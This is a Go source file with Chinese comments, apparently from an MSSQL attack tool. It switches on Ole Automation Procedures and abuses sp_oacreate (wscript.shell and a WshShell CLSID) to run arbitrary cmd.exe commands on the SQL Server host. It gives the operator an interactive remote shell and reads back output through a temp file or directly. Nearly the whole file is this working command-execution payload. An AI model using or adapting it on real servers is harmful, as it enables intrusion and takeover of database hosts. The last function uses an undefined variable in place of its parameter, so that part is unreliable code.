package pac

import (
	"bufio"
	"database/sql"
	"fmt"
	"os"
	"strings"
)

// 开启sp_oacreate
func OpenSpoacreate(conn *sql.DB) {

	sqlstr1 := "select count(*) from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE';"
	MssqlCMD(sqlstr1, conn)
	Info("select count(*) from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE';执行正常")

	Info("尝试开启sp_oacreate存储过程")
	sqlstr2 := "exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE;"
	MssqlCMD(sqlstr2, conn)
	Info("exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE;执行正常")
}

// 开启sp_oacreate之后获取一个cmd shell,回显方法一
func CMDconsole_Spoacreate(conn *sql.DB) {

	table := Creatable(conn)

	Info("执行系统命令")
	reader := bufio.NewReader(os.Stdin)
	for {
		spcmd := "declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,\"c:\\windows\\system32\\cmd.exe /c "
		//var cmd string
		fmt.Printf("%s:%s> $ ", Rhost, Rport)
		cmd, _ := reader.ReadString('\n')
		cmd = strings.TrimRight(cmd, "\r\n")
		if cmd == "exit" || cmd == "q" || cmd == "quit" {
			break
		}
		//"declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\\windows\\system32\\cmd.exe /c whoami>C:\\\\1a1.txt'"
		aa := fmt.Sprintf("%s%s > C:\\\\test11.txt\";", spcmd, cmd)
		Info(aa)
		MssqlCMD(aa, conn)
		Insertresult(table, conn)
	}
}

// 执行单条命令
func CMDone_Spoacreate(cmd1 string, conn *sql.DB) (err error) {
	table := Creatable(conn)

	Info("执行系统命令")
	spcmd := "declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,\"c:\\windows\\system32\\cmd.exe /c "
	aa := fmt.Sprintf("%s%s >> C:\\test11.txt\";", spcmd, cmd1)
	Info(aa)
	MssqlCMD(aa, conn)

	Insertresult(table, conn)

	return err
}

// 回显方法二,直接回显
func CMDconsole_Spoacreate_two(conn *sql.DB) {

	Info("执行系统命令")
	reader := bufio.NewReader(os.Stdin)
	for {
		spcmd := "declare @luan int,@exec int,@text int,@str varchar(8000);exec sp_oacreate '{72C24DD5-D70A-438B-8A42-98424B88AFB8}',@luan output exec sp_oamethod @luan,'exec',@exec output,'c:\\windows\\system32\\cmd.exe /c "
		fmt.Printf("%s:%s> $ ", Rhost, Rport)
		cmd, _ := reader.ReadString('\n')
		cmd = strings.TrimRight(cmd, "\r\n")
		if cmd == "exit" || cmd == "q" || cmd == "quit" {
			break
		}
		aa := fmt.Sprintf("%s%s';exec sp_oamethod @exec, 'StdOut', @text out;exec sp_oamethod @text, 'readall', @str out select @str;", spcmd, cmd)
		Info(aa)
		MssqlCMD(aa, conn)
	}
}

func CMDone_Spoacreate_two(cmd1 string, conn *sql.DB) (err error) {
	Info("执行系统命令")
	spcmd := "declare @luan int,@exec int,@text int,@str varchar(8000);exec sp_oacreate '{72C24DD5-D70A-438B-8A42-98424B88AFB8}',@luan output exec sp_oamethod @luan,'exec',@exec output,'c:\\windows\\system32\\cmd.exe /c "
	aa := fmt.Sprintf("%s%s';exec sp_oamethod @exec, 'StdOut', @text out;exec sp_oamethod @text, 'readall', @str out select @str;", spcmd, cmd)
	Info(aa)
	MssqlCMD(aa, conn)
	return err
}
